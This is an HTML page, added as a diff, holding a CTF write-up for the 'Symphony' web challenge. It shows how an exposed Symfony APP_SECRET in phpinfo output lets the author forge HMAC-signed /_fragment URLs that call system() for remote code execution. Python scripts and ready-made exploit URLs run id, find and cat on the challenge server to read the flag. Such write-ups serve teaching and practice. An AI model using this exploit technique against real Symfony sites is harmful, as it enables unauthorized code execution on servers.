@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+          <title>domyos writeups</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta charset="utf-8" />
+        <link href="https://domyos.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="domyos writeups Full Atom Feed" />
+        <!-- twitter card metadata -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://domyos.github.io/images/zwiebel_small_nobackground.png">
+<meta name="twitter:site" content="@d0myos">
+<meta name="twitter:title" content="Symphony writeup">
+<meta name="twitter:description" content="">
+        <!-- OG Tags -->
+<meta property="og:url" content="https://domyos.github.io/symphony-writeup.html"/>
+<meta property="og:title" content="domyos writeups | Symphony writeup" />
+<meta property="og:description" content="" />
+        <!-- favicon -->
+        <!-- moment.js for date formatting -->
+        <script src="https://domyos.github.io/theme/js/moment.js"></script>
+        <!-- css -->
+        <link rel="stylesheet" type="text/css" href="https://domyos.github.io/theme/css/main.css" />
+		<script>
+			
+                /*! grunt-grunticon Stylesheet Loader - v2.1.2 | https://github.com/filamentgroup/grunticon | (c) 2015 Scott Jehl, Filament Group, Inc. | MIT license. */
+    
+    (function(e){function t(t,n,r,o){"use strict";function a(){for(var e,n=0;u.length>n;n++)u[n].href&&u[n].href.indexOf(t)>-1&&(e=!0);e?i.media=r||"all":setTimeout(a)}var i=e.document.createElement("link"),l=n||e.document.getElementsByTagName("script")[0],u=e.document.styleSheets;return i.rel="stylesheet",i.href=t,i.media="only x",i.onload=o||null,l.parentNode.insertBefore(i,l),a(),i}var n=function(r,o){"use strict";if(r&&3===r.length){var a=e.navigator,i=e.Image,l=!(!document.createElementNS||!document.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect||!document.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#Image","1.1")||e.opera&&-1===a.userAgent.indexOf("Chrome")||-1!==a.userAgent.indexOf("Series40")),u=new i;u.onerror=function(){n.method="png",n.href=r[2],t(r[2])},u.onload=function(){var e=1===u.width&&1===u.height,a=r[e&&l?0:e?1:2];n.method=e&&l?"svg":e?"datapng":"png",n.href=a,t(a,null,null,o)},u.src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==",document.documentElement.className+=" grunticon"}};n.loadCSS=t,e.grunticon=n})(this);(function(e,t){"use strict";var n=t.document,r="grunticon:",o=function(e){if(n.attachEvent?"complete"===n.readyState:"loading"!==n.readyState)e();else{var t=!1;n.addEventListener("readystatechange",function(){t||(t=!0,e())},!1)}},a=function(e){return t.document.querySelector('link[href$="'+e+'"]')},c=function(e){var t,n,o,a,c,i,u={};if(t=e.sheet,!t)return u;n=t.cssRules?t.cssRules:t.rules;for(var l=0;n.length>l;l++)o=n[l].cssText,a=r+n[l].selectorText,c=o.split(");")[0].match(/US\-ASCII\,([^"']+)/),c&&c[1]&&(i=decodeURIComponent(c[1]),u[a]=i);return u},i=function(e){var t,o,a;o="data-grunticon-embed";for(var c in e)if(a=c.slice(r.length),t=n.querySelectorAll(a+"["+o+"]"),t.length)for(var i=0;t.length>i;i++)t[i].innerHTML=e[c],t[i].style.backgroundImage="none",t[i].removeAttribute(o);return t},u=function(t){"svg"===e.method&&o(function(){i(c(a(e.href))),"function"==typeof t&&t()})};e.embedIcons=i,e.getCSS=a,e.getIcons=c,e.ready=o,e.svgLoadedCallback=u,e.embedSVG=u})(grunticon,this);
+                
+                grunticon(["https://domyos.github.io/theme/css/icons.data.svg.css", "https://domyos.github.io/theme/css/icons.data.png.css", "https://domyos.github.io/theme/css/icons.fallback.css"]);
+            </script>
+        <noscript><link href="https://domyos.github.io/theme/css/icons.fallback.css" rel="stylesheet"></noscript>
+        <!-- menu toggle javascript -->
+        <script type="text/javascript">
+            document.addEventListener("DOMContentLoaded", initMenu);
+            
+            function initMenu(){
+                var menu = document.getElementById("menu");
+                var menulink = document.getElementById("menu-link");
+                menulink.addEventListener("click", function toggleMenu(){
+                        window.event.preventDefault();
+                        menulink.classList.toggle('active');
+                        menu.classList.toggle('active');              
+                    });
+            };
+        </script>
+
+
+    <meta name="tags" content="web" />
+
+</head>
+<body>     <div role="banner" id="masthead">
+        <header>
+	    <a href="/"><img src="https://domyos.github.io/images/zwiebel_small_nobackground.png" alt="domyos's Logo" style="border-radius: 50%;"></a>
+            <a href="#menu" id="menu-link">mehr</a>
+            <nav id="menu">
+                <ul>
+                            <li class="active"><a href="https://domyos.github.io/category/ctf-writeups.html">CTF writeups</a></li>
+                </ul>
+            </nav>
+        </header>
+    </div>
+        <div class="page" role="main">
+  <div class="article" role="article">
+    <article>
+        <footer>
+            <a name="top"></a>
+            <p>
+              <time datetime=" 2022-03-14 00:00:00+01:00">
+                <script>document.write(moment('2022-03-14 00:00:00+01:00').format('DD.MM.YYYY'));</script>
+              </time>
+            </p>
+        </footer>
+        <header>
+          <h2>
+            Symphony writeup
+          </h2>
+        </header>
+      <div class="content">
+         <h1>Web</h1>
+<h2>🎵</h2>
+<p><img width="511" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158144742-a5ee9ca5-3395-46ad-a76b-9ffcc88a336c.png"></p>
+<p>If we inspect the website at the given link we can see that is displays the output of <code>phpinfo()</code>
+<img width="946" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158144934-bd4d0957-f59b-494f-bfee-577d978ff592.png"></p>
+<p>Further down in the page we see two interesting environment variables <code>APP_SECRET</code> and <code>SYMFONY_DOTENV_VARS</code></p>
+<p><img width="946" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158145144-7bb1c71a-7370-4bb3-9ae8-1d01eceeb49f.png"></p>
+<p>This indicated that the page is built with <a href="https://symfony.com/">Symphony</a>.</p>
+<p>After some googling I found the following <a href="https://www.ambionics.io/blog/symfony-secret-fragment">blog post</a> that describes a way to gain remote code execution in Symphony based websites.</p>
+<h3>Testing for vulnerability</h3>
+<p>To test whether we can apply this exploit or not we open http://challs.dvc.tf:9000/_fragment which returns the expected HTTP 403.</p>
+<p><img width="623" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158145976-0680863a-ce43-4aa1-b66b-fb789bac20b6.png"></p>
+<h3>Calculate valid signature</h3>
+<p>As described in the blog post we calculate the proper HMAC with the exposed <code>APP_SECRET</code> and the URL we want to access:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># APP_SECRET exposed from phpinfo: 60b938ad59ac73568c7f2d6c282cd084</span>
+
+<span class="c1"># calculate HMAC with secret and URL</span>
+<span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">hmac</span><span class="o">,</span> <span class="nn">hashlib</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">HMAC</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;60b938ad59ac73568c7f2d6c282cd084&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;http://challs.dvc.tf:9000/_fragment&#39;</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()))</span>
+<span class="c1"># b&#39;fyV4XdLD0haRSGyIJA4CMbbai6jSknB09Tk+CE2/i/k=&#39;</span>
+
+<span class="c1"># add calculated HMAC to request</span>
+<span class="c1"># http://challs.dvc.tf:9000/_fragment?_hash=fyV4XdLD0haRSGyIJA4CMbbai6jSknB09Tk+CE2/i/k=    </span>
+
+<span class="c1"># url encode</span>
+<span class="c1"># http://challs.dvc.tf:9000/_fragment?_hash=fyV4XdLD0haRSGyIJA4CMbbai6jSknB09Tk%2BCE2%2Fi%2Fk%3D</span>
+</code></pre></div>
+
+<p>Now the webserver returns HTTP 404 instead of 403:
+ <img alt="grafik" src="https://user-images.githubusercontent.com/3590155/158146959-6556a5fe-4083-4f94-810a-1e058f1dba1a.png"></p>
+<h3>Remote code execution</h3>
+<p>We now know that we can properly calculate the HMAC so we try to run some code on the server:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># calculate HMAC for call to system(&quot;id&quot;, null) which would be called with</span>
+<span class="c1"># http://challs.dvc.tf:9000/_fragment?_path=_controller=system&amp;command=id&amp;return_value=null</span>
+<span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">hmac</span><span class="o">,</span> <span class="nn">hashlib</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">HMAC</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;60b938ad59ac73568c7f2d6c282cd084&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;http://challs.dvc.tf:9000/_fragment?_path=_controller%3Dsystem</span><span class="si">%26c</span><span class="s1">ommand%3Did</span><span class="si">%26r</span><span class="s1">eturn_value%3Dnull&#39;</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()))</span>
+<span class="c1"># b&#39;KMwS5Oc86Op3T32GVDjKUlzlRcWrqAkXP/HpBI50WiE=&#39;</span>
+
+<span class="c1"># Append hash to url</span>
+<span class="c1"># http://challs.dvc.tf:9000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&amp;_hash=KMwS5Oc86Op3T32GVDjKUlzlRcWrqAkXP%2FHpBI50WiE%3D</span>
+</code></pre></div>
+
+<p><img width="1461" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158147275-14d08b2d-8e6f-4fd5-aec9-997388f24a23.png"></p>
+<p>We can see the result of running id by calling <code>system($command)</code>.</p>
+<h3>Retrieving the flag</h3>
+<p>Now let's use find to find the flag.
+Using the following script we can generate URLs for running arbitrary commands on the server:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">hmac</span><span class="o">,</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span>
+
+<span class="n">appSecret</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;60b938ad59ac73568c7f2d6c282cd084&#39;</span>
+<span class="n">baseUrl</span> <span class="o">=</span> <span class="s1">&#39;http://challs.dvc.tf:9000/_fragment?_path=_controller%3D&#39;</span>
+<span class="n">command</span> <span class="o">=</span> <span class="s2">&quot;system&amp;command=find</span><span class="si">%20%</span><span class="s2">2F%20-name</span><span class="si">%20f</span><span class="s2">lag.%2A&amp;return_value=null&quot;</span>
+<span class="n">fullUrl</span> <span class="o">=</span> <span class="n">baseUrl</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+<span class="nb">hash</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">HMAC</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;60b938ad59ac73568c7f2d6c282cd084&#39;</span><span class="p">,</span> <span class="n">fullUrl</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">),</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>
+</code></pre></div>
+
+<p>print(fullUrl + '&amp;_hash=' + urllib.parse.quote(hash))</p>
+<p>This gives us the URL <code>http://challs.dvc.tf:9000/_fragment?_path=_controller%3Dsystem%26command%3Dfind%2520%252F%2520-name%2520flag.%252A%26return_value%3Dnull&amp;_hash=fQFSkmoPF7cmMBKMyTUdOJGkIIGKuWJKi3NOK7lA2HI%3D</code> which reveals the flag</p>
+<p><img width="624" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158148800-5b27b50e-0f42-4439-ac5d-d3cc472da4c9.png"></p>
+<p>So we create a new URL by replacing the command with <code>"system&amp;command=cat%20%2Fvar%2Fwww%2Fhtml%2Fchall%2Fflag.txt%20&amp;return_value=null"</code>.
+The new URL is <code>http://challs.dvc.tf:9000/_fragment?_path=_controller%3Dsystem%26command%3Dcat%2520%252Fvar%252Fwww%252Fhtml%252Fchall%252Fflag.txt%2520%26return_value%3Dnull&amp;_hash=3gkvuAFZrCeS0a0xE51myb6xBQejXT3x0uZRJi0GcK8%3D</code>.</p>
+<p><img width="624" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158149072-1a4bc591-3de1-4ec5-bd3b-91fb82c75d64.png"></p>
+<p>Entering this URL in the browser gives us the flag <code>dvCTF{1c5b0abc99b19effaacd1aa7d6ec28f8}</code></p>
+      </div>
+      <div class="back-to-top">
+          <a href="#top">Zurück zum Seitenanfang</a>
+      </div>
+    </article>
+  </div>
+<!-- end article -->
+                <footer>
+                    <div class="icons">
+                        <a href="https://twitter.com/d0myos" target="_blank"><div class="icon-twitter icon"></div></a>
+                        <a href="https://github.com/domyos" target="_blank"><div class="icon-github icon"></div></a>
+                    </div>
+                    <p>© <script>document.write(moment().format('YYYY'));</script> domyos</p>
+                </footer>
+        </div>
+</body>
+</html>
